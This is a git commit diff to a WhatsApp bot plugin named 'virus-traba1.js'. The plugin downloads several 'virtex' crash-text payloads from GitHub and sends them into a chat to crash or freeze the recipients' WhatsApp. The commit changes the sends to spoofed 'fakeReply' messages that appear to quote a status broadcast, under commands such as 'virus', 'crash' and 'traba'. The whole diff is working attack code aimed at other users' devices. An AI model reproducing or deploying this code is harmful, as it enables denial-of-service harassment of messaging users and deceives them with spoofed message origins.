6b11095da703fa469db7a98ea4c6209cd10ea627
BrunoSobrino <90165013+BrunoSobrino@users.noreply.github.com>
2022-09-24 06:45:20 -0500

    🧿 𝚃𝚑𝚎 𝙼𝚢𝚜𝚝𝚒𝚌 - 𝙱𝚘𝚝 🔮

--- plugins/virus-traba1.js
+++ plugins/virus-traba1.js
@@ -7,11 +7,12 @@ let virtex3 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/p
 let virtex4 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());
 let virtex5 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());
 conn.sendPresenceUpdate('recording', m.chat)
-m.reply(virtex, estiloaudio);
-m.reply(virtex2, estiloaudio);
+conn.fakeReply(m.chat, virtex, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
+conn.fakeReply(m.chat, virtex2, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
 conn.sendPresenceUpdate('recording', m.chat)
-m.reply(virtex3, estiloaudio);
-m.reply(virtex4, estiloaudio);
+conn.fakeReply(m.chat, virtex3, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
+conn.fakeReply(m.chat, virtex4, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
+conn.fakeReply(m.chat, virtex5, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
 conn.sendPresenceUpdate('recording', m.chat)}
 handler.command = ['virus1', 'c1', 'binario1', 'traba1', 'crash1', 'virus', 'binario', 'traba', 'crash'] 
 handler.rowner = true
